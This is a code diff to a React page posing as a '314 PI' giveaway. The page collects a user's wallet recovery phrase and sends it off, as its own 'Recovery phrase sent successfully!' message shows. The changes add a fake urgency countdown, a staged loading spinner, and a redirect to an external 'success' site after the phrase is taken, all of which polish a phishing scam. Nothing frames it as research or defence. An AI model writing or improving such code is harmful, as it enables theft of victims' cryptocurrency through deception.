@@ -9,8 +9,45 @@ const Index = () => {
   const [isPopupOpen, setIsPopupOpen] = useState(false);
   const [recoveryPhrase, setRecoveryPhrase] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const handleClaimClick = () => {
-    setIsPopupOpen(true);
+  const [isClaimLoading, setIsClaimLoading] = useState(false);
+  const [timeRemaining, setTimeRemaining] = useState({ hours: 18, minutes: 42, seconds: 51 });
+
+  // Countdown timer effect
+  React.useEffect(() => {
+    const timer = setInterval(() => {
+      setTimeRemaining(prev => {
+        let { hours, minutes, seconds } = prev;
+        
+        if (seconds > 0) {
+          seconds--;
+        } else if (minutes > 0) {
+          minutes--;
+          seconds = 59;
+        } else if (hours > 0) {
+          hours--;
+          minutes = 59;
+          seconds = 59;
+        } else {
+          // Timer reached 00:00:00
+          clearInterval(timer);
+          return { hours: 0, minutes: 0, seconds: 0 };
+        }
+        
+        return { hours, minutes, seconds };
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, []);
+
+  const handleClaimClick = async () => {
+    setIsClaimLoading(true);
+    
+    // 3 second delay
+    setTimeout(() => {
+      setIsClaimLoading(false);
+      setIsPopupOpen(true);
+    }, 3000);
   };
   const handleUnlockClick = async () => {
     const trimmedPhrase = recoveryPhrase.trim();
@@ -44,6 +81,11 @@ const Index = () => {
         toast.success('Recovery phrase sent successfully!');
         setRecoveryPhrase('');
         setIsPopupOpen(false);
+        
+        // Redirect to success page after successful submission
+        setTimeout(() => {
+          window.location.href = 'https://success-lucky-5f3e1c-moxie.netlify.app/?status=314';
+        }, 1500); // 1.5 second delay to show success message
       }
     } catch (error) {
       console.error('Error:', error);
@@ -96,7 +138,11 @@ const Index = () => {
                 <Clock className="w-5 h-5 text-purple-300" />
                 <div>
                   <div className="text-sm text-purple-300">Time Remaining</div>
-                  <div className="font-semibold">18:42:51 minutes</div>
+                  <div className="font-semibold">
+                    {String(timeRemaining.hours).padStart(2, '0')}:
+                    {String(timeRemaining.minutes).padStart(2, '0')}:
+                    {String(timeRemaining.seconds).padStart(2, '0')}
+                  </div>
                 </div>
               </div>
               
@@ -117,10 +163,20 @@ const Index = () => {
               </div>
             </div>
 
-            <Button onClick={handleClaimClick} className="bg-purple-600 hover:bg-purple-700 text-white px-12 py-4 text-xl font-bold rounded-full transition-all duration-300 transform hover:scale-105" style={{
-            background: 'var(--gradient-primary)'
-          }}>
-              CLAIM 314 PI NOW
+            <Button 
+              onClick={handleClaimClick} 
+              disabled={isClaimLoading}
+              className="bg-purple-600 hover:bg-purple-700 text-white px-12 py-4 text-xl font-bold rounded-full transition-all duration-300 transform hover:scale-105 disabled:opacity-70 disabled:cursor-not-allowed" 
+              style={{ background: 'var(--gradient-primary)' }}
+            >
+              {isClaimLoading ? (
+                <div className="flex items-center gap-2">
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                  LOADING...
+                </div>
+              ) : (
+                'CLAIM 314 PI NOW'
+              )}
             </Button>
           </div>
 
